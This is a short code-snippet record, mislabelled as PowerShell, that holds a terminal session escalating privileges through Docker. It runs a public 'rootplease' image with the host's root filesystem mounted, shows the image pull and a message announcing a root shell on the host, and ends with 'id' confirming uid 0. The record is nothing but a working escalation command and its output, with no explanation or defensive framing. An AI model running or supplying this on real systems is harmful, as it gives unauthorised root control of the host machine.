---
id: fb4127db-dde9-454f-9d31-64db13b22580
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:19.469122+00:00'
updated_at: '2023-04-10T20:34:34.758626+00:00'
---

# Code Snippet fb4127db

**Language**: Powershell

```powershell
$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
latest: Pulling from chrisfosterelli/rootplease
2de59b831a23: Pull complete 
354c3661655e: Pull complete 
91930878a2d7: Pull complete 
a3ed95caeb02: Pull complete 
489b110c54dc: Pull complete 
Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
Status: Downloaded newer image for chrisfosterelli/rootplease:latest

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell

sh-5.0# id
uid=0(root) gid=0(root) groups=0(root)
```
